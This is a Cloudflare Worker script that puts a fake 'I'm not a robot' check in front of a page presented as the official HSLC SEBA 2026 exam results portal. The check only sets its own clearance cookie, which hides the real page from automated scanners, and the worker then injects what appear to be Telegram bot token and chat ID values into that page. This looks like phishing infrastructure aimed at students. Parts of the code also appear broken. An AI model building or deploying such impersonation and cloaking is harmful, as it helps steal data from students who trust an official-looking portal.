// _worker.js - Updated with bot challenge
export default {
    async fetch(request, env) {
        const url = new URL(request.url);
        
        // Check if this is a challenge bypass
        const hasChallenge = request.headers.get('CF-Challenge-Bypass') || 
                            request.cookies?.get('cf_clearance');
        
        // If no challenge passed and requesting HTML page, show challenge
        if (!hasChallenge && (url.pathname === '/' || url.pathname.endsWith('.html'))) {
            return new Response(generateChallengePage(), {
                headers: { 'Content-Type': 'text/html' }
            });
        }
        
        // Serve your normal HTML with env variables
        if (url.pathname === '/') {
            const html = await fetch('index.html').then(res => res.text());
            const modifiedHtml = html
                .replace('{{BOT_TOKEN}}', env.BOT_TOKEN || '')
                .replace('{{CHAT_ID}}', env.CHAT_ID || '');
            
            return new Response(modifiedHtml, {
                headers: { 
                    'Content-Type': 'text/html',
                    'Cache-Control': 'no-store'
                }
            });
        }
        
        return fetch(request);
    }
};

function generateChallengePage() {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying Human - HSLC SEBA 2026</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #2563eb, #1e40af);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }

        .challenge-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 2rem;
            padding: 3rem 2rem;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 30px 50px -25px rgba(0, 0, 0, 0.3);
            text-align: center;
            animation: slideUp 0.5s ease;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .robot-icon {
            font-size: 5rem;
            margin-bottom: 1rem;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        h1 {
            font-size: 1.8rem;
            color: #0f172a;
            margin-bottom: 1rem;
            font-weight: 600;
        }

        p {
            color: #334155;
            margin: 1rem 0;
            line-height: 1.6;
            font-size: 1rem;
        }

        .checkbox-group {
            margin: 2rem 0;
            padding: 1rem;
            background: #f8fafc;
            border-radius: 1rem;
        }

        .checkbox-label {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            cursor: pointer;
            font-size: 1.1rem;
        }

        .checkbox-label input {
            width: 20px;
            height: 20px;
            cursor: pointer;
        }

        .verify-btn {
            background: linear-gradient(135deg, #2563eb, #1e40af);
            color: white;
            border: none;
            padding: 1rem 2rem;
            border-radius: 60px;
            font-size: 1.2rem;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 10px 20px -8px #2563eb;
        }

        .verify-btn:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 20px 30px -10px #2563eb;
        }

        .verify-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .footer {
            margin-top: 2rem;
            font-size: 0.85rem;
            color: #64748b;
        }

        .loader {
            display: none;
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #2563eb;
            border-radius: 50%;
            margin: 1rem auto;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .badge {
            background: #2563eb10;
            color: #2563eb;
            padding: 0.5rem 1rem;
            border-radius: 60px;
            display: inline-block;
            font-size: 0.9rem;
            margin-bottom: 1rem;
        }
    </style>
</head>
<body>
    <div class="challenge-card">
        <div class="badge">🔒 Security Check</div>
        <div class="robot-icon">🤖</div>
        <h1>Verify You're Human</h1>
        <p>To protect our services from automated bots and ensure fair access for all students, please complete this quick verification.</p>
        
        <div class="checkbox-group">
            <label class="checkbox-label">
                <input type="checkbox" id="humanCheckbox">
                <span>I'm not a robot</span>
            </label>
        </div>

        <div id="loader" class="loader"></div>
        <button id="verifyBtn" class="verify-btn" disabled>VERIFY NOW</button>

        <div class="footer">
            <p>HSLC SEBA 2026 Result • Official Portal</p>
        </div>
    </div>

    <script>
        const checkbox = document.getElementById('humanCheckbox');
        const verifyBtn = document.getElementById('verifyBtn');
        const loader = document.getElementById('loader');

        checkbox.addEventListener('change', function() {
            verifyBtn.disabled = !this.checked;
        });

        verifyBtn.addEventListener('click', function() {
            // Show loading
            verifyBtn.style.display = 'none';
            loader.style.display = 'block';
            
            // Set challenge cookie
            document.cookie = "cf_clearance=verified; path=/; max-age=3600; SameSite=Lax";
            
            // Redirect to actual site after delay
            setTimeout(() => {
                window.location.href = '/';
            }, 1500);
        });

        // Auto-focus checkbox
        checkbox.focus();
    </script>
</body>
</html>
    `;
}
